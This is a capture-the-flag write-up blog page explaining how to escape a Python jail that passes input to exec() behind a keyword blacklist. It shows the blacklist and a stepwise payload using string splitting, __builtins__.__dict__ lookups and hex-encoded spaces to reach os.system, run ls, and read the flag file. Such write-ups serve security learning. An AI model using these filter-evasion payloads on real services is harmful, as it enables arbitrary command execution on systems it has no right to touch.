@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:Lucas Sass Rósinberg]">
+<meta name="description" content="I Want To Break Free We are given a Python file which asks us whether we can escape from jail and prompts us for an input. This input is run directly in an exec() call &amp;ndash; except if it is found to be unsafe. It is unsafe in the following two cases:
+ One of the characters are outside the ASCII range, 33-126  This includes space, which is therefore not allowed   A word from the provided blacklist is part of the input  The blacklist contains:" />
+<meta name="keywords" content="CTF" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://github.com/Lucassass/CTF-Writeups.github.io/posts/iwanttobreakfree/" />
+
+
+    <title>
+        
+            Killer-Queen CTF: I Want To Break Free :: Hello Friend  — A Simple CTF Writeup site/blog
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/Lucassass/CTF-Writeups.github.io/main.17863a81d979b637a02cd7632a4d86e9d80563ef460fd6af1a56962efcaa066b.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/Lucassass/CTF-Writeups.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/Lucassass/CTF-Writeups.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/Lucassass/CTF-Writeups.github.io/favicon-16x16.png">
+    <link rel="manifest" href="/Lucassass/CTF-Writeups.github.io/site.webmanifest">
+    <link rel="mask-icon" href="/Lucassass/CTF-Writeups.github.io/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/Lucassass/CTF-Writeups.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+    <meta name="theme-color" content="">
+
+
+
+<meta itemprop="name" content="Killer-Queen CTF: I Want To Break Free">
+<meta itemprop="description" content="I Want To Break Free We are given a Python file which asks us whether we can escape from jail and prompts us for an input. This input is run directly in an exec() call &ndash; except if it is found to be unsafe. It is unsafe in the following two cases:
+ One of the characters are outside the ASCII range, 33-126  This includes space, which is therefore not allowed   A word from the provided blacklist is part of the input  The blacklist contains:"><meta itemprop="datePublished" content="2021-10-29T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2021-10-29T00:00:00+00:00" />
+<meta itemprop="wordCount" content="419">
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Killer-Queen CTF: I Want To Break Free"/>
+<meta name="twitter:description" content="I Want To Break Free We are given a Python file which asks us whether we can escape from jail and prompts us for an input. This input is run directly in an exec() call &ndash; except if it is found to be unsafe. It is unsafe in the following two cases:
+ One of the characters are outside the ASCII range, 33-126  This includes space, which is therefore not allowed   A word from the provided blacklist is part of the input  The blacklist contains:"/>
+
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2021-10-29 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/Lucassass/CTF-Writeups.github.io" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello friend</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/Lucassass/CTF-Writeups.github.io/about">About</a></li><li><a href="/Lucassass/CTF-Writeups.github.io/posts">posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        2 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://github.com/Lucassass/CTF-Writeups.github.io/posts/iwanttobreakfree/">Killer-Queen CTF: I Want To Break Free</a>
+      </h1>
+
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <h1 id="i-want-to-break-free">I Want To Break Free</h1>
+<p>We are given a Python file which asks us whether we can escape from jail and prompts us for an input. This input is run directly in an <code>exec()</code> call &ndash; except if it is found to be unsafe. It is unsafe in the following two cases:</p>
+<ul>
+<li>One of the characters are outside the ASCII range, 33-126
+<ul>
+<li>This includes space, which is therefore not allowed</li>
+</ul>
+</li>
+<li>A word from the provided blacklist is part of the input</li>
+</ul>
+<p>The blacklist contains:</p>
+<pre tabindex="0"><code>cat
+grep
+nano
+import
+eval
+subprocess
+input
+sys
+execfile
+builtins
+open
+dict
+exec
+for
+dir
+file
+input
+write
+while
+echo
+print
+int
+os
+</code></pre><p>What we typically want in these sorts of challenges is to execute code in the server shell, so we can read out the flag. We do this by trying to get access to <code>os.system()</code>. If we have access to <code>__builtins__</code>, then we can run commands by using e.g.</p>
+<pre><code>__builtins__.__import__('os').system('ls')
+</code></pre>
+<p>We have a few issues here. <code>import</code>, <code>os</code>, and <code>system</code> are all blacklisted. We can easily get around the <code>os</code> problem by just splitting the string in two and using string concatenation:</p>
+<pre><code>__builtins__.__import__('o''s').system('ls')
+</code></pre>
+<p>To get around the <code>import</code> and <code>system</code> problems, we can &ndash; instead of using dot notation &ndash; get the elements from e.g. <code>__builtins__</code> as a dictionary by using <code>__builtins__.__dict__</code> and then access what we want as a key instead:</p>
+<pre><code>__builtins__.__dict__['__import__']('o''s').__dict__['system']('ls')
+</code></pre>
+<p>And now that we access them as a string, we can use the same string splitting to get around the blacklist. This lets us execute <code>ls</code> on the server to find the flag:</p>
+<pre><code>__builtins__.__dict__['__imp''ort__']('o''s').__dict__['sy''stem']('ls')
+</code></pre>
+<p>and we get</p>
+<pre tabindex="0"><code>bin
+blacklist.txt
+boot
+cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt
+dev
+etc
+home
+jail.py
+lib
+lib32
+lib64
+libx32
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+</code></pre><p>The flag is very likely to be in the file with the long hex name, so we want to run <code>cat</code> on this - we can just use <code>cat c*.txt</code> to shorten the command, as this is the only txt file starting with <code>c</code>. We run into other issues here - first, the <code>cat</code> command is blacklisted, so we must split it up. And secondly we are using our first space, which is not allowed. Since we use it in a string, the easy fix is to just use another encoding of it, e.g. <code>\x20</code> in hex (or something else in binary or octal). This will be used as a space, but there is no longer a space in the actual input:</p>
+<pre><code>__builtins__.__dict__['__imp''ort__']('o''s').__dict__['sy''stem']('ca''t\x20c*.txt')
+</code></pre>
+<p>Inputting this, we get the flag.</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        419 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2021-10-29 02:00
+        
+
+         
+          
+        
+      </p>
+    </div>
+
+    
+    <div class="pagination">
+        <div class="pagination__title">
+            <span class="pagination__title-h"></span>
+            <hr />
+        </div>
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://github.com/Lucassass/CTF-Writeups.github.io/posts/brokecollegestudents/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">Killer-Queen CTF: Broke College Students</span>
+                </a>
+            </span>
+            
+
+            
+            <span class="button next">
+                <a href="https://github.com/Lucassass/CTF-Writeups.github.io/posts/obligatoryshark/">
+                    <span class="button__text">Killer-Queen CTF: Obligatory Shark</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/Lucassass/CTF-Writeups.github.io/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js" integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>
+
+
+
+    </body>
+</html>
